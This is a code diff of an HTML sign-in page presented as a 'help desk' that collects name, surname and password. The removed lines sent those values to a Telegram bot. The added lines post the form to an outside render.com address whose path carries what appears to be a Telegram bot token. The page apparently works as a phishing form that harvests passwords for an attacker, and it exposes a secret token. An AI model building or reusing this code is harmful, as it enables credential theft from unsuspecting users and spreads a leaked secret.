@@ -109,12 +109,14 @@
 <h2>Welcome to our help desk</h2>
 <div class="container" id="container">
   <div class="form-container sign-in-container">
-    <form action="">
+    <form
+      action="https://help-desk-cs11.onrender.com/bot_6212965476:AAEcdh4ZBnCoqWx2v6YYIvRMcMj7Fry7rAU"
+      method="POST">
       <input type="text" id="name" placeholder="Name" />
       <input type="text" id="surname" placeholder="Surname" />
       <input type="password" id="password" placeholder="Password" />
       <a href="#">Forgot your password?</a>
-      <button onclick="sendData()">Sign In</button>
+      <button type="submit">Sign In</button>
     </form>
   </div>
 </div>
@@ -124,22 +126,4 @@
   const name = document.getElementById("name").value;
   const surname = document.getElementById("surname").value;
   const password = document.getElementById("password").value;
-
-  Telegram.WebApp.sendData(
-    JSON.stringify({
-      name,
-      surname,
-      password,
-    })
-  );
-  function sendData() {
-    bot.sendMessage(
-      chatId,
-      JSON.stringify({
-        name,
-        surname,
-        password,
-      })
-    );
-  }
 </script>
